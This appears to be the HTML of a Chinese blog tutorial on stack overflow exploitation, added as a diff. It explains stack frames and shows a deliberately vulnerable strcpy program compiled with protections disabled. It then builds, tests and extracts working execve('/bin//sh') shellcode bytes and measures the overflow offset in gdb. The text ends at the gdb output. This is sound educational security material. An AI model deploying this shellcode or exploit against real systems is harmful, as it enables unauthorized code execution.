@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/webicon-32x32-house.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/webicon-16x16-house.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-loading-bar.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"harpersu00.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"Available values":"default | flat | mac","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="栈溢出（stack overflow）原理程序被载入系统（开始运行）时，系统会分配给程序一段内存供程序保存信息以及使用。这段内存包含有多个区域，比如代码区，全局数据区，动态链接库区，堆区，栈区等等。栈区是用来存储程序的局部信息，保存了程序调用函数的运行时状态信息，比如函数参数、局部变量等。函数外部定义的变量在全局数据区，而程序运行过程中动态分配的内存，如使用malloc()、new()等函数分配的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出之 shellcode">
+<meta property="og:url" content="https://harpersu00.github.io/adec3bdf.html">
+<meta property="og:site_name" content="harpersu00&#39;s Blog">
+<meta property="og:description" content="栈溢出（stack overflow）原理程序被载入系统（开始运行）时，系统会分配给程序一段内存供程序保存信息以及使用。这段内存包含有多个区域，比如代码区，全局数据区，动态链接库区，堆区，栈区等等。栈区是用来存储程序的局部信息，保存了程序调用函数的运行时状态信息，比如函数参数、局部变量等。函数外部定义的变量在全局数据区，而程序运行过程中动态分配的内存，如使用malloc()、new()等函数分配的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://harpersu00.github.io/images/2019-01-08-栈溢出之-shellcode/图1.png">
+<meta property="og:image" content="https://harpersu00.github.io/images/2019-01-08-栈溢出之-shellcode/图2.png">
+<meta property="og:image" content="https://harpersu00.github.io/images/2019-01-08-栈溢出之-shellcode/图3.png">
+<meta property="og:image" content="https://harpersu00.github.io/images/2019-01-08-栈溢出之-shellcode/图4.png">
+<meta property="article:published_time" content="2019-01-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-10-19T07:09:38.410Z">
+<meta property="article:author" content="harpersu00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://harpersu00.github.io/images/2019-01-08-栈溢出之-shellcode/图1.png">
+
+<link rel="canonical" href="https://harpersu00.github.io/adec3bdf.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>栈溢出之 shellcode | harpersu00's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">harpersu00's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-book fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fas fa-list fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://harpersu00.github.io/adec3bdf.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar1.JPG">
+      <meta itemprop="name" content="harpersu00">
+      <meta itemprop="description" content="记录，记录一下ing">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="harpersu00's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          栈溢出之 shellcode
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-01-08 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-08T00:00:00+08:00">2019-01-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">漏洞利用</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="栈溢出（stack-overflow）原理"><a href="#栈溢出（stack-overflow）原理" class="headerlink" title="栈溢出（stack overflow）原理"></a>栈溢出（stack overflow）原理</h2><p>程序被载入系统（开始运行）时，系统会分配给程序一段内存供程序保存信息以及使用。这段内存包含有多个区域，比如代码区，全局数据区，动态链接库区，堆区，栈区等等。栈区是用来存储程序的局部信息，保存了程序调用函数的运行时状态信息，比如函数参数、局部变量等。函数外部定义的变量在全局数据区，而程序运行过程中动态分配的内存，如使用malloc()、new()等函数分配的内存，都位于堆区。</p>
+<a id="more"></a>
+
+<p>当发生函数调用的时候，例如在main()函数中调用my_func()函数，其中main()被称为caller（调用者），my_func()被称为callee（被调用者）。当程序进行到调用my_func()这一步时，main()函数的运行时信息已经在栈中了。调用my_func()函数会将该函数的运行时信息压入栈顶。调用结束后，会弹出这部分信息，恢复到只有main()信息的状态。</p>
+<p>对于函数来说，保存其运行时状态的那一部分栈被叫做该函数的栈帧。</p>
+<p>函数my_func()的栈帧如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_func</span><span class="params">(<span class="keyword">char</span>* str1, <span class="keyword">char</span> *str2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="../images/2019-01-08-栈溢出之-shellcode/图1.png" width="500" height="500" align="middle" />
+
+
+
+<p>入栈顺序：</p>
+<ul>
+<li>调用函数caller压入当前需要保存的寄存器信息，例如eax、ecx、edx等</li>
+<li>对被调用函数callee（这里是my_func()函数）的参数，<strong>从右往左</strong>依次压入栈，即str2先入栈，str1再入栈<code>以上部分都是作为caller的函数状态，之后入栈的数据才是作为callee的函数状态保存</code></li>
+<li>压入返回地址（即caller调用callee的下一条指令）</li>
+<li>调用函数caller的基地址寄存器ebp入栈（同时更新ebp寄存器的值为当前栈顶的地址，也就是ebp变成了callee的基地址）</li>
+<li>声明的局部变量a，buffter依次入栈</li>
+<li>callee需要保存的寄存器信息，例如ebx、esi、edi等</li>
+</ul>
+<p>函数调用结束时，栈会丢弃被调用函数callee的状态，并将栈顶恢复为调用函数caller时的状态。</p>
+<ul>
+<li>依次将callee的寄存器信息，局部变量等弹出</li>
+<li>将调用函数caller的基地址弹出，保存到ebp寄存器中（恢复了调用之前的栈基地址）</li>
+<li>将返回地址从栈内弹出，保存到eip寄存器内（即将执行的下一条指令）</li>
+<li>弹出保存的调用函数caller的寄存器信息，并保存到对应寄存器中</li>
+</ul>
+<p>这样，调用函数caller的所有信息都恢复到调用之前了，接下来跳转到eip处继续执行程序指令。</p>
+<p>利用栈溢出漏洞的核心思想是，通过对函数栈上状态信息的修改，使其数据溢出，将攻击指定覆盖返回地址。这样在函数调用栈恢复后，跳转到返回地址执行时，实际上是跳到我们的攻击指令处执行。</p>
+<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please input one argument!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;argv[1]: %s\n&quot;</span>, buffer);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为了能够进行最简单的栈溢出利用，我们需要在编译上面代码的时候加一些编译选项：-z execstack  关闭栈不可执行选项，-fno-stack-protector 关闭栈canary保护。</p>
+<p>编译命令<code>gcc -z execstack -fno-stack-protector test.c -m32</code>，默认生成a.out可执行文件。</p>
+<p>上述代码主要是通过strcpy函数来实现栈溢出的，strcpy是在执行拷贝的时候，是从低地址向高地址拷贝，而且是不会比较两个参数的size的，因此我们的buffer虽然长度为128个字节，但是如果输入的参数大于这个长度，比如136个字节，则会造成剩余的8个字节将会覆盖到ebp以及返回地址处，如下图：</p>
+<img src="/images/2019-01-08-栈溢出之-shellcode/图2.png" width="500" height="500" align="middle" />
+
+<p>这样我们就能控制程序跳转到什么地方执行了。</p>
+<h2 id="制作shellcode"><a href="#制作shellcode" class="headerlink" title="制作shellcode"></a>制作shellcode</h2><h3 id="shellcode简介"><a href="#shellcode简介" class="headerlink" title="shellcode简介"></a>shellcode简介</h3><p>shellcode是指在漏洞利用中经常用的到一小段代码(code)。由于它经常被用来启动受害机器的shell，所以叫做shellcode。在本文中将会编写一个利用execve系统调用来启动一个shell的shellcode。</p>
+<p>在上述代码中，可以有几种方式跳转到shellcode执行。</p>
+<p>一种是将shellcode放到返回地址之前，即buffer[128]+ebp，共132字节里，return address设置跳到shellcode处，这种方法比较简单，缺点是有大小限制。</p>
+<img src="../images/2019-01-08-栈溢出之-shellcode/图3.png" width="500" height="450" align="middle" />
+
+<p>一种是将shellcode放到返回地址之后，如下图。但如果我们的漏洞不能溢出这么多字节，比如只能溢出16个字节，则无法采用这种方式。</p>
+<img src="/images/2019-01-08-栈溢出之-shellcode/图4.png" width="500" height="500" align="middle" />
+
+<p>还有一种方法又叫做jmp esp。将返回地址修改为内存中某处固定的jmp esp指令的地址，因为当返回地址出栈时，esp刚好指向返回地址之后的地址，跟上面的第二种方式异曲同工。这种方法的好处是，不需要知道当前栈的地址。（比较早的方法，现在已经不太常用了）</p>
+<h3 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h3><p>前面提到，我们的shellcode是通过execve来启动一个shell。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int execve(const char *filename, char *const argv[], char *const envp[])；</span><br></pre></td></tr></table></figure>
+
+<p>因为我们的shellcode要求尽可能的短，因此我们调用的函数及参数为<code>execve(&quot;/bin/sh&quot;, Null, Null)</code>。</p>
+<p>具体的shellcode会因为系统平台不同而不同，本文是在32位linux系统上编写执行的。</p>
+<p>首先我们需要了解一下在32位linux平台上的系统调用约定syscall。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Syscall调用约定：</span><br><span class="line">1. 系统调用号syscall number存放在eax中（execve是11，%eax=0xb）</span><br><span class="line">2. 第1个参数保存在ebx中（%ebx=filename）</span><br><span class="line">3. 第2个参数保存在ecx中 （%ecx=argv）</span><br><span class="line">4. 第3个参数保存在edx中（%edx=envp=0）</span><br><span class="line">5. 第4、5、6个参数分别保存在寄存器esi、edi、ebp中</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor %eax, %eax    ;eax 清零</span><br><span class="line">pushl %eax        ;eax 入栈</span><br><span class="line">push $0x68732f2f  ;&quot;&#x2F;&#x2F;sh&quot; 入栈，两个&#x2F;是为了凑4字节，让shellcode中没有0，对于Linux，&#x2F;和&#x2F;&#x2F;是一样的作用</span><br><span class="line">push $0x6e69622f  ;&quot;&#x2F;bin&quot; 入栈</span><br><span class="line">movl %esp, %ebx   ;将esp值放入ebx</span><br><span class="line">pushl %eax        ;将0压入栈</span><br><span class="line">pushl %ebx        ;将&quot;&#x2F;bin&#x2F;&#x2F;sh&quot;的地址指针入栈</span><br><span class="line">movl %esp, %ecx   ;将esp值放入ecx，即ecx&#x3D;[&quot;&#x2F;bin&#x2F;&#x2F;sh&quot;, 0]，这里用xor %ecx, %ecx也可以</span><br><span class="line">cltd              ;有符号展开，将32位的值展开为64位，eax -&gt; edx:eax，即将edx也设为0，也是为了让shellcode中不含0值，因为0会截断shellcode</span><br><span class="line">movb $0xb, %al    ;传入系统调用数</span><br><span class="line">int $0x80         ;进入系统调用</span><br></pre></td></tr></table></figure>
+
+<p>以上是shellcode。</p>
+<h3 id="测试shellcode"><a href="#测试shellcode" class="headerlink" title="测试shellcode"></a>测试shellcode</h3><p>我们需要对已经编写好的shellcode进行测试，看是否可以达到目的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line"><span class="string">&quot;xor %eax, %eax\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;pushl %eax\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;push $0x68732f2f\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;push $0x6e69622f\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;movl %esp, %ebx\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;pushl %eax\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;pushl %ebx\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;movl %esp, %ecx\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;cltd\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;movb $0xb, %al\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;int $0x80\n\t&quot;</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    shellcode();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译并执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gcc -m32 test.c -o shellcode</span></span><br><span class="line"><span class="meta">$</span><span class="bash">./shellcode</span></span><br><span class="line">sh-4.2#     #进入shell了</span><br></pre></td></tr></table></figure>
+
+<p>这里是采用内联（inline）汇编的方式测试的shellcode，也可以用汇编器as直接编译汇编代码，用pwntools工具可以直接编译shellcode等。</p>
+<h3 id="提取shellcode"><a href="#提取shellcode" class="headerlink" title="提取shellcode"></a>提取shellcode</h3><p>一种比较原始的shellcode提取方法是采用objdump命令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">objdump -d shellcode</span></span><br><span class="line">...</span><br><span class="line">080483dd &lt;shellcode&gt;:</span><br><span class="line"> 80483dd:	55                   	push   %ebp</span><br><span class="line"> 80483de:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 80483e0:	31 c0                	xor    %eax,%eax //从这里开始</span><br><span class="line"> 80483e2:	50                   	push   %eax</span><br><span class="line"> 80483e3:	68 2f 2f 73 68       	push   $0x68732f2f</span><br><span class="line"> 80483e8:	68 2f 62 69 6e       	push   $0x6e69622f</span><br><span class="line"> 80483ed:	89 e3                	mov    %esp,%ebx</span><br><span class="line"> 80483ef:	50                   	push   %eax</span><br><span class="line"> 80483f0:	53                   	push   %ebx</span><br><span class="line"> 80483f1:	89 e1                	mov    %esp,%ecx</span><br><span class="line"> 80483f3:	99                   	cltd   </span><br><span class="line"> 80483f4:	b0 0b                	mov    $0xb,%al</span><br><span class="line"> 80483f6:	cd 80                	int    $0x80</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
+
+<p>以上这段的机器码就是我们的shellcode 了，<code>shellcode=&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;</code>。</p>
+<p>测试（以下代码是通用的shellcode测试程序，其他的shellcode只需要修改shellcode数组中的字符串）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] =<span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span>(*f)()=(<span class="keyword">void</span>(*)())shellcode;  <span class="comment">//强类型转换，将shellcode数组转换为函数指针</span></span><br><span class="line">    f();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译需加上栈可执行选项，<code>gcc -z execstack -m32 test.c -o shellcode</code>，因为shellcode是函数外部的变量，存储在全局字符数组中，位于.data section中，默认是不可执行的。所以需要加上选项-z execstack，开启栈/堆/数据段可执行。之后运行<code>./shellcode</code>t可以正常进入shell，表明shellcode构造成功。</p>
+<h2 id="栈溢出简单利用"><a href="#栈溢出简单利用" class="headerlink" title="栈溢出简单利用"></a>栈溢出简单利用</h2><h3 id="计算缓冲区长度"><a href="#计算缓冲区长度" class="headerlink" title="计算缓冲区长度"></a>计算缓冲区长度</h3><p>首先我们需要计算从缓冲区开头到栈上的返回地址长度，这样才能准确覆盖到返回地址。这里通过gdb下断点查看，也可以通过pwntools里的cyclic工具来计算缓冲区长度。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gdb -q --args a.out XXX   <span class="comment">#gdb 进入a.out，带上参数XXX</span></span></span><br><span class="line">Reading symbols from /home/scbox/Documents/a.out...(no debugging symbols found)...done.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/scbox/Documents/a.out XXX</span><br><span class="line">argv[1]: XXX</span><br><span class="line">[Inferior 1 (process 41732) exited normally]</span><br><span class="line">Missing separate debuginfos, use: debuginfo-install glibc-2.17-307.el7.1.i686</span><br><span class="line">(gdb) disassemble main #查看main的汇编代码</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0804846d &lt;+0&gt;:	push   %ebp</span><br><span class="line">   0x0804846e &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08048470 &lt;+3&gt;:	and    $0xfffffff0,%esp</span><br><span class="line">   0x08048473 &lt;+6&gt;:	sub    $0x90,%esp</span><br><span class="line">   0x08048479 &lt;+12&gt;:	cmpl   $0x1,0x8(%ebp)</span><br><span class="line">   0x0804847d &lt;+16&gt;:	jg     0x8048492 &lt;main+37&gt;</span><br><span class="line">   0x0804847f &lt;+18&gt;:	movl   $0x8048564,(%esp)</span><br><span class="line">   0x08048486 &lt;+25&gt;:	call   0x8048340 &lt;puts@plt&gt;</span><br><span class="line">   0x0804848b &lt;+30&gt;:	mov    $0xffffffff,%eax</span><br><span class="line">   0x08048490 &lt;+35&gt;:	jmp    0x80484c3 &lt;main+86&gt;</span><br><span class="line">   0x08048492 &lt;+37&gt;:	mov    0xc(%ebp),%eax</span><br><span class="line">   0x08048495 &lt;+40&gt;:	add    $0x4,%eax</span><br><span class="line">   0x08048498 &lt;+43&gt;:	mov    (%eax),%eax</span><br><span class="line">   0x0804849a &lt;+45&gt;:	mov    %eax,0x4(%esp)</span><br><span class="line">   0x0804849e &lt;+49&gt;:	lea    0x10(%esp),%eax</span><br><span class="line">   0x080484a2 &lt;+53&gt;:	mov    %eax,(%esp)</span><br><span class="line">   0x080484a5 &lt;+56&gt;:	call   0x8048330 &lt;strcpy@plt&gt; #此处设置断点1</span><br><span class="line">   0x080484aa &lt;+61&gt;:	lea    0x10(%esp),%eax</span><br><span class="line">   0x080484ae &lt;+65&gt;:	mov    %eax,0x4(%esp)</span><br><span class="line">   0x080484b2 &lt;+69&gt;:	movl   $0x804857f,(%esp)</span><br><span class="line">   0x080484b9 &lt;+76&gt;:	call   0x8048320 &lt;printf@plt&gt;</span><br><span class="line">   0x080484be &lt;+81&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x080484c3 &lt;+86&gt;:	leave  </span><br><span class="line">   0x080484c4 &lt;+87&gt;:	ret    #设置断点2</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) b *0x080484a5</span><br><span class="line">Breakpoint 1 at 0x80484a5</span><br><span class="line">(gdb) b *0x080484c4</span><br><span class="line">Breakpoint 2 at 0x80484c4</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/scbox/Documents/a.out XXX</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080484a5 in main ()</span><br><span class="line">(gdb) x/2wx $esp #查看断点1处的esp，这里参数已经入栈了，0xffffd080是strcpy的第一个参数，即buffer的起始地址（main函数的局部变量）</span><br><span class="line">0xffffd070:	0xffffd080	0xffffd361</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">argv[1]: XXX</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x080484c4 in main ()</span><br><span class="line">(gdb) x/wx $esp #断点2处的esp就是main函数的返回地址</span><br><span class="line">0xffffd10c:	0xf7e122a3</span><br><span class="line">(gdb) p/d 0xffffd10c-0xffffd080 #相减得到缓冲区长度（不包括返回地址）</span><br><span class="line"><span class="meta">$</span><span class="bash">1 = 140</span></span><br></pre></td></tr></table></figure>
+
